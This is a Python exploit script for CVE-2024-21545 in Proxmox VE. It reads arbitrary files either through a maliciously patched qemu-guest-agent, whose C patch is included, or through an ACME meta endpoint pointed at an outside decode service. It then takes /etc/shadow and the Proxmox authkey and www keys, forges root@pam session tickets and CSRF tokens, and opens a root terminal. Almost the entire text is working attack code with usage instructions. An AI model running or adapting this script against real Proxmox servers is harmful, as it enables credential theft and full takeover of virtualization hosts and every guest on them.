#!/usr/bin/env python3
"""
CVE-2024-21545 - Proxmox VE Arbitrary File Read -> Full System Compromise
Discovered by Snyk Security Labs

Requirements:
- Vector 1: VM.Monitor privilege + root in a VM with qemu-guest-agent
- Vector 2: Sys.Audit privilege (limited - www-data only)

Impact: Read sensitive files, forge root sessions, full system takeover
"""

import requests
import urllib3
import base64
import time
import hmac
import hashlib
import subprocess
import sys
import os

urllib3.disable_warnings()


class ProxmoxExploit:
    def __init__(self, host, verify_ssl=False):
        self.base_url = f"https://{host}:8006"
        self.session = requests.Session()
        self.session.verify = verify_ssl
        self.ticket = None
        self.csrf = None
        self.node = None
        
    def authenticate(self, username, password):
        """Authenticate and obtain session tokens"""
        resp = self.session.post(
            f"{self.base_url}/api2/json/access/ticket",
            data={"username": username, "password": password}
        )
        if resp.status_code != 200:
            raise Exception(f"Authentication failed: {resp.text}")
            
        data = resp.json()["data"]
        self.ticket = data["ticket"]
        self.csrf = data["CSRFPreventionToken"]
        self.session.cookies.set("PVEAuthCookie", self.ticket)
        self.session.headers.update({"CSRFPreventionToken": self.csrf})
        print(f"[+] Authenticated as {username}")
        return True
        
    def get_nodes(self):
        """Get available cluster nodes"""
        resp = self.session.get(f"{self.base_url}/api2/json/nodes")
        nodes = [n["node"] for n in resp.json()["data"]]
        self.node = nodes[0] if nodes else None
        return nodes
        
    def check_vm_monitor_permission(self, vmid):
        """Verify VM.Monitor permission on target VM"""
        resp = self.session.get(
            f"{self.base_url}/api2/json/nodes/{self.node}/qemu/{vmid}/agent/info"
        )
        return resp.status_code != 403

    # ============================================================
    # VECTOR 1: Malicious QEMU Guest Agent (VM.Monitor required)
    # ============================================================
    
    def read_file_via_agent(self, vmid, filepath):
        """
        Exploit via malicious qemu-guest-agent response.
        Requires patched qemu-ga running in the VM.
        
        The patched agent returns:
        {"return":{"download":{"path":"<filepath>","content-type":"text/plain"}}}
        """
        # The NOTFOUND prefix triggers our patched agent
        resp = self.session.post(
            f"{self.base_url}/api2/json/nodes/{self.node}/qemu/{vmid}/agent/exec",
            data={"command": f"NOTFOUND{filepath}"}
        )
        
        if resp.status_code == 200:
            # If patched agent is working, we get raw file contents
            return resp.text
        return None

    # ============================================================
    # VECTOR 2: ACME Meta Endpoint (Sys.Audit required)
    # Limited impact - runs as www-data, not root
    # ============================================================
    
    def read_file_via_acme(self, filepath, callback_url):
        """
        Exploit via ACME directory meta endpoint.
        Requires external server returning crafted JSON.
        
        NOTE: This runs as www-data, so cannot read /etc/shadow
        or auth keys. Limited to log files, configs, etc.
        """
        # The callback URL should return:
        # {"meta":{"download":{"path":"<filepath>","content-type":"text/plain"}}}
        
        payload = {
            "meta": {
                "download": {
                    "path": filepath,
                    "content-type": "text/plain"
                }
            }
        }
        
        # Using httpbingo.org for PoC (returns base64-decoded JSON)
        payload_b64 = base64.b64encode(
            str(payload).replace("'", '"').encode()
        ).decode()
        
        evil_url = f"https://httpbingo.org/base64/decode/{payload_b64}"
        
        resp = self.session.get(
            f"{self.base_url}/api2/json/cluster/acme/meta",
            params={"directory": evil_url}
        )
        
        if resp.status_code == 200:
            return resp.text
        return None

    # ============================================================
    # SESSION FORGERY (requires auth keys from Vector 1)
    # ============================================================
    
    def forge_session(self, authkey_content, www_key_content, target_user="root@pam"):
        """
        Forge authentication tokens using stolen keys.
        
        Token format: PVE:[user]:[hex_timestamp]::[base64_signature]
        CSRF format:  [hex_timestamp]:[hmac_signature]
        """
        timestamp = format(int(time.time()), 'X')
        
        # Sign auth ticket with RSA key
        auth_data = f"PVE:{target_user}:{timestamp}"
        
        # Write key to temp file for openssl
        with open("/tmp/authkey.pem", "w") as f:
            f.write(authkey_content)
        
        # Sign using openssl (mimics Perl's Crypt::OpenSSL::RSA)
        proc = subprocess.run(
            ["openssl", "dgst", "-sha256", "-sign", "/tmp/authkey.pem"],
            input=auth_data.encode(),
            capture_output=True
        )
        signature = base64.b64encode(proc.stdout).decode()
        ticket = f"{auth_data}::{signature}"
        
        # Generate CSRF token with HMAC-SHA256
        csrf_data = f"{timestamp}:{target_user}"
        csrf_hmac = hmac.new(
            www_key_content.encode(),
            csrf_data.encode(),
            hashlib.sha256
        ).digest()
        csrf_token = base64.b64encode(csrf_hmac).decode()
        csrf_token = f"{timestamp}:{csrf_token}"
        
        os.remove("/tmp/authkey.pem")
        
        return ticket, csrf_token

    def use_forged_session(self, ticket, csrf_token):
        """Switch to forged session tokens"""
        self.ticket = ticket
        self.csrf = csrf_token
        self.session.cookies.set("PVEAuthCookie", ticket)
        self.session.headers.update({"CSRFPreventionToken": csrf_token})

    def get_shell(self):
        """Open VNC/terminal console as root"""
        resp = self.session.post(
            f"{self.base_url}/api2/json/nodes/{self.node}/termproxy",
            data={}
        )
        if resp.status_code == 200:
            return resp.json()["data"]
        return None


def generate_evil_qemu_ga_patch():
    """
    Generate the C code patch for qemu-guest-agent.
    Apply to commands/commands.c or main/main.c send_response function.
    """
    patch = '''
// Add to send_response() function in qemu-ga
// This intercepts error responses and injects our payload

char *path;
if ((path = strstr(response->str, "Failed to execute child process \\\\u201CNOTFOUND")) != NULL) {
    path += strlen("Failed to execute child process \\\\u201CNOTFOUND");
    char *end = strstr(path, "\\\\u201D");
    if (end) {
        end[0] = '\\0';
        GString *new_response = g_string_new("{\\"return\\":{\\"download\\":{\\"path\\":\\"");
        g_string_append(new_response, path);
        g_string_append(new_response, "\\",\\"content-type\\":\\"text/plain\\"}}}");
        g_string_assign(response, new_response->str);
        g_string_free(new_response, TRUE);
    }
}
'''
    return patch


def main():
    if len(sys.argv) < 5:
        print(f"Usage: {sys.argv[0]} <host> <username> <password> <vmid>")
        print(f"Example: {sys.argv[0]} proxmox.local lowpriv@pve password 102")
        sys.exit(1)
    
    host = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    vmid = sys.argv[4]
    
    exploit = ProxmoxExploit(host)
    
    # Step 1: Authenticate
    exploit.authenticate(username, password)
    exploit.get_nodes()
    print(f"[+] Target node: {exploit.node}")
    
    # Step 2: Verify permissions
    if exploit.check_vm_monitor_permission(vmid):
        print(f"[+] Confirmed VM.Monitor permission on /vms/{vmid}")
    else:
        print(f"[-] No VM.Monitor permission on VM {vmid}")
        sys.exit(1)
    
    # Step 3: Test arbitrary file read
    print("\n[*] Testing arbitrary file read via malicious guest agent...")
    print("[!] Ensure patched qemu-ga is running in the VM")
    
    shadow = exploit.read_file_via_agent(vmid, "/etc/shadow")
    if shadow and "root:" in shadow:
        print("[+] Successfully read /etc/shadow:")
        print(shadow[:200] + "...")
    else:
        print("[-] File read failed - is patched qemu-ga running?")
        print("\n[*] Patch code for qemu-guest-agent:")
        print(generate_evil_qemu_ga_patch())
        sys.exit(1)
    
    # Step 4: Steal authentication keys
    print("\n[*] Stealing authentication keys...")
    
    authkey = exploit.read_file_via_agent(vmid, "/etc/pve/priv/authkey.key")
    if not authkey or "BEGIN RSA PRIVATE KEY" not in authkey:
        print("[-] Failed to read authkey.key")
        sys.exit(1)
    print("[+] Got authkey.key")
    
    www_key = exploit.read_file_via_agent(vmid, "/etc/pve/pve-www.key")
    if not www_key:
        print("[-] Failed to read pve-www.key")
        sys.exit(1)
    print("[+] Got pve-www.key")
    
    # Step 5: Forge root session
    print("\n[*] Forging root@pam session...")
    ticket, csrf = exploit.forge_session(authkey, www_key.strip(), "root@pam")
    print(f"[+] Forged ticket: {ticket[:50]}...")
    print(f"[+] Forged CSRF: {csrf}")
    
    # Step 6: Use forged session
    exploit.use_forged_session(ticket, csrf)
    
    # Verify we're now root
    resp = exploit.session.get(f"{exploit.base_url}/api2/json/access/permissions")
    if resp.status_code == 200:
        print("\n[+] SUCCESS - Now authenticated as root@pam!")
        print("[+] Full system compromise achieved")
    else:
        print("[-] Session forgery failed")
        

if __name__ == "__main__":
    main()
